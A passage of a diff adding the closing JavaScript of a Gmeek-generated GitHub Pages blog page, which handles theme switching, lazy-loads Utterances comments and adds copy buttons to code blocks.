+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
